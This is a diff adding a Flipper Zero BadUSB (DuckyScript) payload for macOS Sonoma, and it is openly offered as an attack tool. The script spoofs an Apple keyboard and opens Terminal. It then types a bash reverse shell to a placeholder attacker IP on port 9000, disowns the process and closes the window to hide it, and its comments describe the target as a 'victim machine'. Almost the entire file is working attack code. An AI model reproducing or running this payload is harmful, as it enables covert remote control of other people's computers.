@@ -1,0 +1,28 @@
+REM reverse shell special MacOS Sonoma and the extra security added (mostly popup windows with confirmation needed)
+REM This script will open the terminal, open a remote connexion beteween the Mac and another computer. You need to replace REPLACE_WITH_LOCAL_IP_OF_YOUR_ATTACKER_COMPUTER with your IP.
+REM Then it closes the terminal window without closing the connexion (a little bit like an @echo off).
+REM Note that you will need to physically access the victim machine (unlocked). You can disconnect the flipper0 once injected.
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 200
+STRING terminal
+DELAY 200
+ENTER
+DELAY 1000
+STRING bash -c "bash -i >& /dev/tcp/REPLACE_WITH_LOCAL_IP_OF_YOUR_ATTACKER_COMPUTER/9000 0>&1"
+DELAY 1000
+ENTER
+CONTROL z
+STRING bg
+DELAY 200
+ENTER
+DELAY 200
+STRING disown
+DELAY 200
+ENTER
+DELAY 200
+GUI w
+DELAY 200
+ENTER
+DELAY 1000
